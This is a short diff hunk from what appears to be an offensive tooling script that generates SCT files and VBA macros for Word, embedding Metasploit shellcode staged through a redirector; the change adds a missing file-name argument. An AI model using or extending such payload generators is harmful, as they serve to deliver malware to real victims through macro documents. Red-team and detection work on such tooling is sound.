@@ -61,7 +61,7 @@ def genSCT(framework, stagingMethod, redirector, x86, x64, cspayload='cs.sct'):
 			genVBAMacro('payload.sct', stagingMethod, msfShellCode, x86, x64)
 		elif 'Word' in stagingMethod:
 			msfShellCode = getMetasploitShellCode(redirector)
-			genVBAMacro(stagingMethod, msfShellCode, x86, x64)
+			genVBAMacro('payload.sct', stagingMethod, msfShellCode, x86, x64)
 		else:
 			print('[-] ERROR: VBAMacro method is not supported. Exiting.')
 			exit()
